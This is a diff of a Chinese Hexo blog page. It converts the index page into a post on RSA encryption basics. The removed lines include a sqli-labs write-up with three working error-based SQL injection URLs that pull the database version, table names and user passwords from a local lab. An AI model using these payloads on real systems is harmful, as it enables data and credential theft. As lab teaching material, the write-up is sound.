@@ -21,28 +21,36 @@
     var CONFIG = {"hostname":"sinanya.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="司南的博客">
-<meta property="og:url" content="https://sinanya.github.io/index.html">
+  <meta name="description" content="RSA的加密与解密​    RSA的加密和解密都是在整数环&amp;#x2124;n内完成的，模计算在其中发挥了核心作用。假设使用RSA加密明文x，而表示x的位字符串则是&amp;#x2124;n&#x3D; {0，1，2，3，…，n-1}内的元素。所以明文x表示的二进制值必然小于n。对于密文而言，这个原理也成立。 RSA相关的术语与符号表示：公钥：（e，n） 私钥：（d，n） 明文：m 密文：c RSA的三大算法密钥生成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="这是我的第一篇博客">
+<meta property="og:url" content="https://sinanya.github.io/2021/07/12/RSA%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="司南的博客">
+<meta property="og:description" content="RSA的加密与解密​    RSA的加密和解密都是在整数环&amp;#x2124;n内完成的，模计算在其中发挥了核心作用。假设使用RSA加密明文x，而表示x的位字符串则是&amp;#x2124;n&#x3D; {0，1，2，3，…，n-1}内的元素。所以明文x表示的二进制值必然小于n。对于密文而言，这个原理也成立。 RSA相关的术语与符号表示：公钥：（e，n） 私钥：（d，n） 明文：m 密文：c RSA的三大算法密钥生成">
 <meta property="og:locale">
+<meta property="og:image" content="https://sinanya.github.io/.io//image-20210712193924137.png">
+<meta property="og:image" content="https://sinanya.github.io/.io//image-20210712195407545.png">
+<meta property="article:published_time" content="2021-07-12T13:42:51.000Z">
+<meta property="article:modified_time" content="2021-07-12T13:49:47.754Z">
 <meta property="article:author" content="sinanya">
+<meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sinanya.github.io/.io//image-20210712193924137.png">
 
-<link rel="canonical" href="https://sinanya.github.io/">
+<link rel="canonical" href="https://sinanya.github.io/2021/07/12/RSA%E5%9F%BA%E7%A1%80/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-Hans'
   };
 </script>
 
-  <title>司南的博客</title>
+  <title>这是我的第一篇博客 | 司南的博客</title>
   
 
 
@@ -150,9 +158,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
@@ -168,10 +177,9 @@
       <meta itemprop="name" content="司南的博客">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/12/RSA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">这是我的第一篇博客</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          这是我的第一篇博客
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -208,7 +216,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="RSA的加密与解密"><a href="#RSA的加密与解密" class="headerlink" title="RSA的加密与解密"></a>RSA的加密与解密</h1><p>​    RSA的加密和解密都是在整数环&#x2124;n内完成的，模计算在其中发挥了核心作用。假设使用RSA加密明文x，而表示x的位字符串则是&#x2124;n= {0，1，2，3，…，n-1}内的元素。所以明文x表示的二进制值必然小于n。对于密文而言，这个原理也成立。</p>
+        <h1 id="RSA的加密与解密"><a href="#RSA的加密与解密" class="headerlink" title="RSA的加密与解密"></a>RSA的加密与解密</h1><p>​    RSA的加密和解密都是在整数环&#x2124;n内完成的，模计算在其中发挥了核心作用。假设使用RSA加密明文x，而表示x的位字符串则是&#x2124;n= {0，1，2，3，…，n-1}内的元素。所以明文x表示的二进制值必然小于n。对于密文而言，这个原理也成立。</p>
 <h2 id="RSA相关的术语与符号表示："><a href="#RSA相关的术语与符号表示：" class="headerlink" title="RSA相关的术语与符号表示："></a>RSA相关的术语与符号表示：</h2><p>公钥：（e，n）</p>
 <p>私钥：（d，n）</p>
 <p>明文：m</p>
@@ -250,214 +258,33 @@
 
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://sinanya.github.io/2021/05/30/%E8%BF%99%E6%98%AF%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sinanya">
-      <meta itemprop="description" content="">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="司南的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/05/30/%E8%BF%99%E6%98%AF%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">这是我的第一篇博客</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-05-30 22:56:56" itemprop="dateCreated datePublished" datetime="2021-05-30T22:56:56+08:00">2021-05-30</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-10 23:35:15" itemprop="dateModified" datetime="2021-06-10T23:35:15+08:00">2021-06-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AD%A6%E4%B9%A0-sqlilabs/" itemprop="url" rel="index"><span itemprop="name">Web学习-sqlilabs</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="SQL注入——报错注入-sqli-labs-Less-5-and-Less-6"><a href="#SQL注入——报错注入-sqli-labs-Less-5-and-Less-6" class="headerlink" title="SQL注入——报错注入 sqli-labs Less-5 and Less-6"></a>SQL注入——报错注入 sqli-labs Less-5 and Less-6</h1><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><blockquote>
-<p>报错注入形式上是两个嵌套的查询，即select…(select…)，里面的select被称为子查询，它的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到几个sql函数：<br>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a，且最接近于a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by clause分组语句，按照查询结果分组<br>通过报错来显示具体的信息。</p>
-<p>以sqli-labs-Less5为例：<br>键入id后：</p>
-<p><img src="../images/Post1_image1.jpg" alt="键入id后"></p>
-<p>加个反斜杠后：</p>
-<p><img src="../images/Post1_image2.jpg" alt="加个反斜杠后"></p>
-<p>分析可知这是自带一个单引号注入<br>接着我们闭合单引号并进行联合查询（union select 1, 2, 3）</p>
-<p><img src="../images/Post1_image3.jpg" alt="联合查询后"></p>
-<p>依旧无法获得显示位<br>那怎样才能看到报错信息?</p>
-<hr>
-<h2 id="这里介绍一下floor-rand-0-2"><a href="#这里介绍一下floor-rand-0-2" class="headerlink" title="这里介绍一下floor(rand(0)*2)"></a>这里介绍一下floor(rand(0)*2)</h2><p>查询的时使用rand()，该值会被执行多次。在使用group by时，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，在插入虚表的时候会再被执行一次。在一次多记录的查询过程中 floor(rand(0)*2)的值是固定的，为011011</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>); </span><br></pre></td></tr></table></figure>
-
-<p>当为第一个数字0时不进行插入虚表；<br>当为第二个数字1时插入虚表，插入后key值为1，count(*)为1；<br>当为第三个数字1时插入虚表，插入后key值为1，因为前面一个1已经插入虚表所以这个1不再在虚表中添加一行，但1对应的 count()加1；<br>当为第四个数字0时，因为虚表中没有对应的记录，所以会重新建立虚表，然后重复上面的操作。<br>所以看似操作了5次，但其实只要前三次就可以卡出来了。</p>
-<hr>
-<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>1.获取数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from(select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from </span></span><br><span class="line"><span class="string">information_schema.tables group by x)a --+</span></span><br></pre></td></tr></table></figure>
-
-<p>2.获取表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from(select count(*),concat((select </span></span><br><span class="line"><span class="string">concat(table_name,0x3a,0x3a)from information_schema.tables where table_schema=database() limit</span></span><br><span class="line"><span class="string">0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span></span><br></pre></td></tr></table></figure>
-
-<p>3.获取用户信息</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from(select count(*),concat((select </span></span><br><span class="line"><span class="string">concat(username, 0x3a,0x3a,password,0x3a,0x3a) from security.users limit </span></span><br><span class="line"><span class="string">5,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<hr>
-<p>Less-6是一样的，把单引号改为双引号。</p>
-<p>图片来源于本人CSDN博客</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51761376/article/details/113996496?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_51761376/article/details/113996496?spm=1001.2014.3001.5501</a></p>
-<p>欢迎大家访问，有错误也请留言，感谢各位！</p>
-<hr>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/30/%E8%BF%99%E6%98%AF%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" rel="prev" title="这是我的第一篇博客">
+      <i class="fa fa-chevron-left"></i> 这是我的第一篇博客
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://sinanya.github.io/2021/05/11/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sinanya">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="司南的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/05/11/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-05-11 21:10:00" itemprop="dateCreated datePublished" datetime="2021-05-11T21:10:00+08:00">2021-05-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-15 23:12:57" itemprop="dateModified" datetime="2021-05-15T23:12:57+08:00">2021-05-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%BF%83%E5%BE%97/" itemprop="url" rel="index"><span itemprop="name">心得</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%BF%83%E5%BE%97/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Hello-Hexo"><a href="#Hello-Hexo" class="headerlink" title="Hello Hexo"></a>Hello Hexo</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -510,6 +337,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RSA%E7%9A%84%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86"><span class="nav-number">1.</span> <span class="nav-text">RSA的加密与解密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA%E7%9B%B8%E5%85%B3%E7%9A%84%E6%9C%AF%E8%AF%AD%E4%B8%8E%E7%AC%A6%E5%8F%B7%E8%A1%A8%E7%A4%BA%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">RSA相关的术语与符号表示：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA%E7%9A%84%E4%B8%89%E5%A4%A7%E7%AE%97%E6%B3%95"><span class="nav-number">1.2.</span> <span class="nav-text">RSA的三大算法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">密钥生成算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="nav-number">1.2.2.</span> <span class="nav-text">加密算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95"><span class="nav-number">1.2.3.</span> <span class="nav-text">解密算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RSA%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9C%80%E6%B1%82%EF%BC%9A"><span class="nav-number">1.2.4.</span> <span class="nav-text">RSA密码体制的一些需求：</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
